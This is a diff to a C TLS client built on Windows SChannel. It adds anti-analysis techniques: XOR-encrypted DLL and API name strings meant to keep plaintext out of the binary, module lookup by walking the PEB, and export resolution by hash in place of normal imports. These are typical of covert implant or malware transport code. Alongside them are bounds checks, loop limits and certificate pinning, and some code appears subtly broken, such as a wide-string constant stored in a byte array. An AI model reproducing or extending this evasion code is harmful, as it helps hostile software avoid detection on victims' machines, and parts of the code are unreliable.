@@ -8,7 +8,13 @@
 #include <windows.h>
 #include <sspi.h>
 #include <schannel.h>
-#pragma comment(lib, "secur32.lib")
+
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "enc_strings.h"
+#include "bcrypt_peb.h"
+#include <wincrypt.h>
 
 /* ── SChannel constants (guard against mingw redefines) ─────────── */
 
@@ -62,10 +68,17 @@
 
 /* SecPkgContext_StreamSizes and SCHANNEL_CRED are defined in Windows headers */
 
-/* ── dynamic load from secur32.dll ─────────────────────────────── */
+/* ── XOR-encrypted strings (no plaintext in .rdata) ─────────────── */
+
+static const uint8_t enc_secur32_dll[] = {
+    0x3c,0x08,0x06,0x12,0x13,0x13,0x61,0x5a,0x01,0x0d,0x00
+};
+#define SECUR32_DLL_LEN 11
 
 static HMODULE g_secur32 = NULL;
 static int g_sec_loaded = 0;
+
+/* Function pointer types for secur32 exports */
 
 typedef SECURITY_STATUS (WINAPI *pAcquireCredA)(
     PCSTR, PCSTR, ULONG, PVOID, PVOID,
@@ -96,19 +109,44 @@ static pDeleteSecCtx    fn_DeleteCtx  = NULL;
 static pFreeCtxBuffer   fn_FreeBuf    = NULL;
 static pQueryCtxAttrA   fn_QueryAttr  = NULL;
 
+/* Resolve function by XOR-encrypted hash (27 iters, exact case) */
+static void* resolve_fn(void* mod, uint32_t hash) {
+    return mirage_get_function_by_hash(mod, hash);
+}
+
 static int sec_ensure_loaded(void) {
     if (g_sec_loaded) return 1;
-    g_secur32 = LoadLibraryA("secur32.dll");
-    if (!g_secur32) return 0;
 
-    fn_Acquire   = (pAcquireCredA)   GetProcAddress(g_secur32, "AcquireCredentialsHandleA");
-    fn_InitSec   = (pInitSecCtxA)    GetProcAddress(g_secur32, "InitializeSecurityContextA");
-    fn_Encrypt   = (pEncryptMsg)     GetProcAddress(g_secur32, "EncryptMessage");
-    fn_Decrypt   = (pDecryptMsg)     GetProcAddress(g_secur32, "DecryptMessage");
-    fn_FreeCred  = (pFreeCredHandle) GetProcAddress(g_secur32, "FreeCredentialsHandle");
-    fn_DeleteCtx = (pDeleteSecCtx)   GetProcAddress(g_secur32, "DeleteSecurityContext");
-    fn_FreeBuf   = (pFreeCtxBuffer)  GetProcAddress(g_secur32, "FreeContextBuffer");
-    fn_QueryAttr = (pQueryCtxAttrA)  GetProcAddress(g_secur32, "QueryContextAttributesA");
+    /* Try PEB walk first — secur32.dll may already be loaded */
+    uint8_t tmp[SECUR32_DLL_LEN];
+    mirage_xor_decrypt(enc_secur32_dll, tmp, SECUR32_DLL_LEN);
+    uint32_t mod_hash = mirage_encrypted_hash_module((const char*)tmp);
+    g_secur32 = (HMODULE)mirage_get_module_by_hash(mod_hash);
+
+    /* Fallback: load via encrypted string */
+    if (!g_secur32) {
+        typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
+        char k32_dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, k32_dll);
+        uint32_t k32_hash = mirage_encrypted_hash_module(k32_dll);
+        void* k32 = mirage_get_module_by_hash(k32_hash);
+        if (!k32) return 0;
+        char ll_fn[32]; enc_decrypt(enc_LoadLibraryA, ENC_LOADLIBRARYA_LEN, ll_fn);
+        pLoadLibraryA fnLoad = (pLoadLibraryA)resolve_fn(k32,
+            mirage_encrypted_hash_func(ll_fn));
+        if (!fnLoad) return 0;
+        g_secur32 = fnLoad((const char*)tmp);
+        if (!g_secur32) return 0;
+    }
+
+    /* Resolve all 8 exports by hash */
+    fn_Acquire   = (pAcquireCredA)   resolve_fn(g_secur32, 0xBFF60A9Bu); /* AcquireCredentialsHandleA */
+    fn_InitSec   = (pInitSecCtxA)    resolve_fn(g_secur32, 0x1F8FADE7u); /* InitializeSecurityContextA */
+    fn_Encrypt   = (pEncryptMsg)     resolve_fn(g_secur32, 0xEA9275EFu); /* EncryptMessage */
+    fn_Decrypt   = (pDecryptMsg)     resolve_fn(g_secur32, 0x124EDDF4u); /* DecryptMessage */
+    fn_FreeCred  = (pFreeCredHandle) resolve_fn(g_secur32, 0x07765BA3u); /* FreeCredentialsHandle */
+    fn_DeleteCtx = (pDeleteSecCtx)   resolve_fn(g_secur32, 0x37E86A76u); /* DeleteSecurityContext */
+    fn_FreeBuf   = (pFreeCtxBuffer)  resolve_fn(g_secur32, 0x3A352AD6u); /* FreeContextBuffer */
+    fn_QueryAttr = (pQueryCtxAttrA)  resolve_fn(g_secur32, 0x4A0B10E0u); /* QueryContextAttributesA */
 
     if (!fn_Acquire || !fn_InitSec || !fn_Encrypt || !fn_Decrypt ||
         !fn_FreeCred || !fn_DeleteCtx || !fn_FreeBuf || !fn_QueryAttr)
@@ -122,7 +160,7 @@ static int sec_ensure_loaded(void) {
 
 static void copy_to_wide(char *dst, size_t dst_cap, const char *src) {
     size_t i;
-    for (i = 0; src[i] && i + 1 < dst_cap; ++i) {
+    for (i = 0; src[i] && (i * 2 + 2) < dst_cap; ++i) {
         dst[i * 2]     = src[i];
         dst[i * 2 + 1] = 0;
     }
@@ -140,8 +178,9 @@ tls_result_t tls_connect(tls_context_t *ctx, HANDLE sock, const char *hostname) 
     TimeStamp  expiry;
     CtxtHandle  ctxt = {0, 0};
 
+    char unisp[32]; enc_decrypt(enc_unisp_name_a, ENC_UNISP_NAME_A_LEN, unisp);
     SECURITY_STATUS ss = fn_Acquire(
-        NULL, "UNISP_NAME_A", SECPKG_CRED_OUTBOUND,
+        NULL, unisp, SECPKG_CRED_OUTBOUND,
         NULL, NULL, NULL, NULL, &cred, &expiry);
     if (ss != SEC_E_OK) return TLS_ERR_CRED_FAILED;
 
@@ -153,8 +192,14 @@ tls_result_t tls_connect(tls_context_t *ctx, HANDLE sock, const char *hostname) 
     int first = 1;
     unsigned char in_buf[0x4000];
     ULONG in_len = 0;
+    int hs_iter = 0;
 
     for (;;) {
+        if (++hs_iter > 50) {
+            fn_DeleteCtx(&ctxt);
+            fn_FreeCred(&cred);
+            return TLS_ERR_HANDSHAKE_FAILED;
+        }
         SecBuffer out_buf;
         out_buf.BufferType = SECBUFFER_TOKEN;
         out_buf.cbBuffer   = 0;
@@ -226,6 +271,45 @@ tls_result_t tls_connect(tls_context_t *ctx, HANDLE sock, const char *hostname) 
         }
     }
 
+#ifdef CERT_PINNING_ENABLED
+    /* Certificate pinning: SHA-256 hash of server cert, compared to CERT_PIN_HASH */
+    {
+#ifndef SECPKG_ATTR_REMOTE_CERT_CONTEXT
+#define SECPKG_ATTR_REMOTE_CERT_CONTEXT 0x53UL
+#endif
+        PCCERT_CONTEXT remote_cert = NULL;
+        SECURITY_STATUS pin_ss = fn_QueryAttr(&ctxt, SECPKG_ATTR_REMOTE_CERT_CONTEXT, &remote_cert);
+        if (pin_ss == SEC_E_OK && remote_cert && remote_cert->pbCertEncoded && remote_cert->cbCertEncoded > 0) {
+            const bcrypt_api_t *bc = mirage_bcrypt_api();
+            if (bc && bc->ready) {
+                BCRYPT_ALG_HANDLE hAlg = NULL;
+                BCRYPT_HASH_HANDLE hHash = NULL;
+                static const UCHAR sha256_oid[] = BCRYPT_SHA256_ALGORITHM;
+                if (bc->pOpen(&hAlg, (LPCWSTR)sha256_oid, NULL, 0) == 0) {
+                    if (bc->pCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) == 0) {
+                        bc->pHashData(hHash, remote_cert->pbCertEncoded, remote_cert->cbCertEncoded, 0);
+                        UCHAR hash[32];
+                        bc->pFinishHash(hHash, hash, 32, 0);
+                        bc->pDestroyHash(hHash);
+
+                        /* Compare against expected pin */
+                        static const UCHAR expected_pin[32] = CERT_PIN_HASH;
+                        if (memcmp(hash, expected_pin, 32) != 0) {
+                            bc->pClose(hAlg, 0);
+                            CertFreeCertificateContext(remote_cert);
+                            fn_DeleteCtx(&ctxt);
+                            fn_FreeCred(&cred);
+                            return TLS_ERR_PIN_FAILED;
+                        }
+                    }
+                    bc->pClose(hAlg, 0);
+                }
+            }
+            CertFreeCertificateContext(remote_cert);
+        }
+    }
+#endif /* CERT_PINNING_ENABLED */
+
     /* query stream sizes */
     SecPkgContext_StreamSizes sizes;
     ss = fn_QueryAttr(&ctxt, SECPKG_ATTR_STREAM_SIZES, &sizes);
@@ -257,11 +341,16 @@ tls_result_t tls_send(tls_context_t *ctx, const uint8_t *data, size_t len, size_
     uint32_t maxm = ctx->max_message;
     size_t total = 0;
 
-    unsigned char msg[0x10000];
+    /* TLS record max 16KB — buffer holds header+payload+trailer */
+    unsigned char msg[0x4000];
 
     while (total < len) {
         size_t chunk = len - total;
         if (chunk > maxm) chunk = maxm;
+        /* ponytail: clamp so frame never exceeds buffer */
+        /* L15: Potential unsigned underflow if hdr+trl > sizeof(msg) — safe because
+         * TLS header+trailer are always < 2KB and buffer is 16KB. */
+        if (hdr + chunk + trl > sizeof(msg)) chunk = sizeof(msg) - hdr - trl;
 
         size_t frame_len = hdr + chunk + trl;
         memset(msg, 0, frame_len);
@@ -318,16 +407,25 @@ tls_result_t tls_recv(tls_context_t *ctx, uint8_t *buf, size_t buf_len, size_t *
 
     CtxtHandle ctxt = {ctx->ctx_lower,  ctx->ctx_upper};
 
-    unsigned char recv_buf[0x10000];
+    /* TLS record max 16KB */
+    unsigned char recv_buf[0x4000];
     size_t recv_len = 0;
 
+    int recv_iter = 0;
     for (;;) {
+        if (++recv_iter > 100) {
+            if (out_read) *out_read = 0;
+            return TLS_ERR_DECRYPT_FAILED;
+        }
         size_t n;
         ws2_result_t r = ws2_recv(ctx->sock, recv_buf + recv_len,
                                   sizeof(recv_buf) - recv_len, &n);
         if (r != WS2_OK) return TLS_ERR_DECRYPT_FAILED;
         if (n == 0 && recv_len == 0) { if (out_read) *out_read = 0; return TLS_OK; }
         recv_len += n;
+
+        /* bounds: a valid TLS record should never exceed 16KB+overhead */
+        if (recv_len > sizeof(recv_buf)) { if (out_read) *out_read = 0; return TLS_ERR_DECRYPT_FAILED; }
 
         SecBuffer bufs[4];
         bufs[0].BufferType = SECBUFFER_DATA;
@@ -364,6 +462,8 @@ tls_result_t tls_recv(tls_context_t *ctx, uint8_t *buf, size_t buf_len, size_t *
         }
 
         if (data_ptr && data_len > 0) {
+            /* bounds: decrypted payload must not exceed TLS record max */
+            if (data_len > 0x4000) return TLS_ERR_DECRYPT_FAILED;
             size_t to_copy = buf_len < data_len ? buf_len : data_len;
             memcpy(buf, data_ptr, to_copy);
 
